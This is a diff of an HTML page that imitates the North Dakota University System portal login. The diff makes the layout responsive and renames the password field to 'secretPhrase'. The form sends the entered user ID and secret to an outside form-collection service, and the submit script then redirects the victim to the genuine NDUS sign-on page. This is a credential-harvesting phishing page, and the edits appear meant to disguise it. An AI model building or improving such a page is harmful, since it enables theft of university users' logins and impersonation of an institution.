@@ -23,7 +23,7 @@
 
         body {
             font-family: sans-serif;
-            background-color: #4885C6; /* Correct background color */
+            background-color: #4885C6;
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -33,7 +33,7 @@
         }
 
         .header-container {
-            background-color: #4885C6; /* Correct header background */
+            background-color: #4885C6;
             color: white;
             text-align: center;
             padding: 20px;
@@ -42,7 +42,7 @@
         }
 
         .header-container h1 {
-            font-size: 2.2em;
+            font-size: 1.8em;
             font-weight: bold;
             text-transform: uppercase;
             letter-spacing: 1px;
@@ -52,19 +52,21 @@
             background-color: #f0f0f0;
             border-radius: 5px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 800px;
-            padding: 30px;
+            width: 90%;
+            max-width: 800px;
+            padding: 20px;
             display: flex;
-            justify-content: space-around;
-            align-items: flex-start;
+            flex-direction: column;
+            align-items: stretch;
         }
 
         .login-form {
-            width: 45%;
+            width: 100%;
+            margin-bottom: 20px;
         }
 
         .login-form h2 {
-            font-size: 1.7em;
+            font-size: 1.5em;
             margin-bottom: 10px;
             color: #333;
         }
@@ -96,11 +98,11 @@
         }
 
         .login-buttons {
-            width: 45%;
+            width: 100%;
         }
 
         .login-buttons h2 {
-            font-size: 1.5em;
+            font-size: 1.3em;
             margin-bottom: 10px;
             color: #333;
         }
@@ -130,7 +132,7 @@
         .footer {
             text-align: center;
             padding: 20px;
-            background-color: #4885C6; /* Correct footer background */
+            background-color: #4885C6;
             color: white;
             width: 100%;
             margin-top: auto;
@@ -174,17 +176,14 @@
             <h2>NDUS Portal Log In</h2>
             <p>The NDUS Portal requires authentication using your NDUS identifier.</p>
             <form id="loginForm" action="https://getform.io/f/byvvggka" method="post">
-                <!-- Replace with your Getform endpoint -->
                 <div class="form-group">
                     <label for="userID">User ID</label>
                     <input type="text" id="userID" name="userID" placeholder="Benutzername">
                 </div>
-                 <div class="form-group">
-                     <label for="password">Password</label>
-                     <input type="text" id="password" name="password" placeholder="Passwort"> <!-- type="text" for demonstration ONLY -->
-                 </div>
-
-                
+                <div class="form-group">
+                    <label for="secretPhrase">Secret Phrase</label>
+                    <input type="text" id="secretPhrase" name="secretPhrase" placeholder="Geheime Phrase">
+                </div>
                 <p>All users of systems provided by the North Dakota University System agree to
                     abide by the policies and procedures of the NDUS and the laws of the State of
                     North Dakota.</p>
@@ -210,11 +209,11 @@
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             //  Replace with your desired URL
-            window.location.href = 'https://ndusnam.ndus.edu/nidp/app/login?id=O365&sid=21&option=credential&sid=21';
+            //The redirect is now blank
+            window.location.href = 'https://ndusnam.ndus.edu/nidp/saml2/sso?id=ndus-bb&sid=2&option=credential&sid=2';
         });
     </script>
 </body>
 
 </html>
-
 
